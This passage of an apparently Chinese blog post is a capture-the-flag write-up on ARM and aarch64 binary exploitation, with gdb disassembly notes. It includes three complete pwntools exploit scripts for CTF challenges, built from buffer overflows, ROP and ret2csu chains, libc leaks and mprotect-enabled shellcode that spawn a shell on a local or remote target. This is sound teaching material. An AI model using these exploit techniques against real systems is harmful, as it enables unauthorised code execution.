class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:movr3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>key1函数将当前的PC读入R3，R3会被移入R0，当作返回值。如上所示，当前PC是<code>0x00008cdc+8</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:push&#123;r6&#125;; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:addr6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:bxr6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:movr3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:addsr3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:push&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:pop&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:pop&#123;r6&#125;; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:movr0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>key2函数变换了一下ARM/THUMB模式，THUMB中指令长度是2字节，预取两条指令就是+4。这个函数也是R3中的值当作返回值。</p><p>在THUMB模式中将PC（0x00008d04+4）移入R3，然后R3又加了4。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:movr3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>key3将lr（返回地址）读入r3。找到main函数中调用key3函数的位置，+4即为返回地址。</p><h3 id="codegate2018-melong"><a href="#codegate2018-melong" class="headerlink" title="codegate2018 melong"></a>codegate2018 melong</h3><p>这个执行文件中，用了很多浮点库函数，加减乘除和浮点比较等等，所以看起来有点抽象。</p><p>漏洞点在PT中的size，输入一个无法malloc的大小，就能绕过检查。</p><p>write_diary使用size的低字节作为输入长度，存在溢出。</p><p>多次运行程序可以发现，libc加载地址没有变化，所以可以第一次泄露libc，第二次getshell。</p><p>我从<a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/#codegate2018---melong">m4x</a>师傅那里看到一个方法，但不明白是如何返回的main函数。。。</p><blockquote><p>2020-10-18更新</p><p>先前LR中所存储的地址是某个函数调用留下的，第一次ROP puts执行完毕，回到了这个地址，pop了PC。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">localfile = <span class="string">&quot;./melong&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;libc.so.6&quot;</span></span><br><span class="line">context.binary = localfile</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Type the number:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your height(meters) : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your weight(kilograms) : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PT</span>(<span class="params">num</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Type the number:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;How long do you want to take personal training?\n&quot;</span>)</span><br><span class="line">    io.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_diary</span>(<span class="params">content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Type the number:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Type the number:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line"><span class="comment"># 0x00011bbc : pop &#123;r0, pc&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    g1 = <span class="number">0x00011bbc</span></span><br><span class="line"></span><br><span class="line">    check()</span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;&quot;&quot;b *0x11288</span></span><br><span class="line">    <span class="comment"># b *0x1118C</span></span><br><span class="line">    <span class="comment"># &quot;&quot;&quot;)</span></span><br><span class="line">    PT(<span class="number">-1</span>)</span><br><span class="line">    payload1 = <span class="string">b&quot;A&quot;</span>*<span class="number">0x54</span> + p32(g1) + p32(elf.got[<span class="string">&quot;puts&quot;</span>]) + p32(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p32(elf.sym[<span class="string">&quot;main&quot;</span>])*<span class="number">6</span></span><br><span class="line">    write_diary(payload1)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;See you again :)\n&quot;</span>)</span><br><span class="line">    puts_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    pf(<span class="string">&quot;puts_addr&quot;</span>, puts_addr)</span><br><span class="line">    libc.address = puts_addr - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    check()</span><br><span class="line">    PT(<span class="number">-1</span>)</span><br><span class="line">    payload2 = <span class="string">b&quot;A&quot;</span>*<span class="number">0x54</span> + p32(g1) + p32(next(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))) + p32(libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">    write_diary(payload2)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, localfile])</span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="Shanghai2018-baby-arm"><a href="#Shanghai2018-baby-arm" class="headerlink" title="Shanghai2018 baby_arm"></a>Shanghai2018 baby_arm</h3><p>aarch64的栈帧布局发生了变化，X29(fp), X30(lr)存储在栈帧底部，数据在上方。</p><p>程序首先读入512字节到bss，然后在子函数（栈帧长0x50）中读入512的数据到栈上，存在溢出。程序有一段未执行的函数，调用了mprotect将0x411000开始的0x1000字节（这段地址包含got，bss等）权限设置为0。</p><p>受此启发，将shellcode读到bss，使用mprotect修改这段地址为可执行，然后劫持控制到bss。</p><p>使用<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#ret2csu">ret2csu</a>的方式进行设置参数劫持调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 位于main函数下方的csu函数</span><br><span class="line">.text:00000000004008AC loc_4008AC                              ; CODE XREF: sub_400868+60↓j</span><br><span class="line">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">.text:00000000004008B0                 MOV             X2, X22</span><br><span class="line">.text:00000000004008B4                 MOV             X1, X23</span><br><span class="line">.text:00000000004008B8                 MOV             W0, W24</span><br><span class="line">.text:00000000004008BC                 ADD             X19, X19, #1</span><br><span class="line">.text:00000000004008C0                 BLR             X3</span><br><span class="line">.text:00000000004008C4                 CMP             X19, X20</span><br><span class="line">.text:00000000004008C8                 B.NE            loc_4008AC</span><br><span class="line">.text:00000000004008CC</span><br><span class="line">.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j</span><br><span class="line">.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span><br><span class="line">.text:00000000004008DC                 RET</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">localfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment"># locallibc = &quot;&quot;</span></span><br><span class="line">context.binary = localfile</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">.text:00000000004008AC loc_4008AC                              ; CODE XREF: sub_400868+60↓j</span></span><br><span class="line"><span class="string">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span></span><br><span class="line"><span class="string">.text:00000000004008B0                 MOV             X2, X22</span></span><br><span class="line"><span class="string">.text:00000000004008B4                 MOV             X1, X23</span></span><br><span class="line"><span class="string">.text:00000000004008B8                 MOV             W0, W24</span></span><br><span class="line"><span class="string">.text:00000000004008BC                 ADD             X19, X19, #1</span></span><br><span class="line"><span class="string">.text:00000000004008C0                 BLR             X3</span></span><br><span class="line"><span class="string">.text:00000000004008C4                 CMP             X19, X20</span></span><br><span class="line"><span class="string">.text:00000000004008C8                 B.NE            loc_4008AC</span></span><br><span class="line"><span class="string">.text:00000000004008CC</span></span><br><span class="line"><span class="string">.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j</span></span><br><span class="line"><span class="string">.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span></span><br><span class="line"><span class="string">.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span></span><br><span class="line"><span class="string">.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span></span><br><span class="line"><span class="string">.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span></span><br><span class="line"><span class="string">.text:00000000004008DC                 RET</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">X21 = address of function address</span></span><br><span class="line"><span class="string">X22 = X2</span></span><br><span class="line"><span class="string">X23 = X1</span></span><br><span class="line"><span class="string">W24 = W0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu_rop</span>(<span class="params">call, x0, x1, x2, ret</span>):</span></span><br><span class="line">    payload  = p64(<span class="number">0x4008CC</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x4008AC</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call) + p64(x2)</span><br><span class="line">    payload += p64(x1) + p64(x0)</span><br><span class="line">    payload += p64(<span class="number">0xdeadbeef</span>) + p64(ret)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sc = asm(shellcraft.execve(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">    io.send(sc)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x48</span> + csu_rop(elf.got[<span class="string">&quot;read&quot;</span>], <span class="number">0</span>, elf.got[<span class="string">&quot;__gmon_start__&quot;</span>], <span class="number">8</span>, <span class="number">0x400824</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(p64(elf.plt[<span class="string">&quot;mprotect&quot;</span>]))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">    io.send(sc)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x48</span> + csu_rop(elf.got[<span class="string">&quot;__gmon_start__&quot;</span>], <span class="number">0x411000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, <span class="number">0x411068</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line"><span class="comment"># libc = ELF(locallibc)</span></span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ciscn2020-final-pwn1pm"><a href="#ciscn2020-final-pwn1pm" class="headerlink" title="ciscn2020 final pwn1pm"></a>ciscn2020 final pwn1pm</h3><p>主要使用了以下两个gadget，控制函数第一个参数。调用printf泄露libc地址，然后<code>system(&quot;bin/sh&quot;)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00010348 : pop &#123;r3, pc&#125;</span><br><span class="line">0x000104f8 : mov r0, r3 ; sub sp, fp, #4 ; pop &#123;fp, pc&#125;</span><br></pre></td></tr></table></figure><p>同一个shell进程本地运行多次可以发现，程序库加载地址和栈地址不会发生变化，但是在另一个shell进程就可能有变化。幸运的是，地址似乎只有两种变化，非此即彼。</p><p>因为<code>sub sp, fp, #4</code>，这里假定了服务器端的栈地址和本地一致，实际不确定。。。</p><p><a href="https://github.com/clxsh/ctf_wps/blob/10c96609740f1c6fadd9ac88a642c1fd0e3eb3d5/others/armpwn/ciscn2020_final_pwn1pm/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./bin&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x00010348 : pop &#123;r3, pc&#125;</span></span><br><span class="line"><span class="string">0x000104f8 : mov r0, r3 ; sub sp, fp, #4 ; pop &#123;fp, pc&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x100</span> + p32(<span class="number">0xfffeeffc</span>) + p32(<span class="number">0x10348</span>) + p32(elf.got[<span class="string">&quot;read&quot;</span>]) + p32(<span class="number">0x104f8</span>) + p32(elf.plt[<span class="string">&quot;printf&quot;</span>])*<span class="number">2</span> + p32(elf.sym[<span class="string">&quot;main&quot;</span>])*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;input: &quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    libc.address = read_addr - libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x100</span> + p32(<span class="number">0xfffef024</span>) + p32(<span class="number">0x10348</span>) + p32(next(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))) + p32(<span class="number">0x104f8</span>) + p32(libc.sym[<span class="string">&quot;system&quot;</span>])*<span class="number">2</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;input: &quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io  = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;./bin&quot;])</span></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/">如何 pwn 掉一个 arm 的binary</a></li><li><a href="https://www.anquanke.com/post/id/199112">ARM架构下的 Pwn 的一般解决思路</a></li><li><a href="https://docs.pwntools.com/en/stable/qemu.html">pwntools doc: QEMU Utilities</a></li><li><a href="https://azeria-labs.com/writing-arm-assembly-part-1/">ARM Assembly Basics Tutorial Series by Azeria</a></li><li><a href="https://stackoverflow.com/questions/53268118/whats-the-difference-between-mov-movz-movn-and-movk-in-armv8-assembly">aarch64 movk movn movz</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sudo apt install qemu-user gdb-multiarch&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;安装完成后就可以运行平台上的静态链接文件了，会自动调用qemu执行。&lt;/p&gt;
&lt;h3 id=&quot;动态链接程序&quot;&gt;&lt;a href=&quot;#动态链接程序&quot; class=&quot;headerlink&quot; title=&quot;动态链接程序&quot;&gt;&lt;/a&gt;动态链接程序&lt;/h3&gt;&lt;p&gt;对于动态链接的程序，还需要安装跨平台的lib。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; apt-cache search &lt;span class=&quot;string&quot;&gt;&amp;quot;libc&amp;quot;&lt;/span&gt; | grep arm&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;安装类似libc6-ARCH-cross。&lt;/p&gt;
